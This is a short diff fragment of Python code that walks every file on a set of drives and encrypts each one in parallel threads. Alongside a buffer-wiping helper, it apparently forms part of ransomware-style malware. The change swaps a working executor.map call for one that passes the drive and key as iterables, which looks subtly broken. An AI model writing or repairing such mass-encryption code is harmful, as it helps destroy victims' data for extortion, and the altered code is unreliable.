@@ -141,8 +141,9 @@ def traverse_encrypt(drive, key):
                 encrypt_file(os.path.join(root, file), key)
 
 def parallel_search(drives, key):
-    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
-        executor.map(lambda drive: traverse_encrypt(drive, key), drives)
+    for drive in drives:
+        with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
+            executor.map(traverse_encrypt, drive, key)
 
 def zero_memory(buffer):
     length = len(buffer)
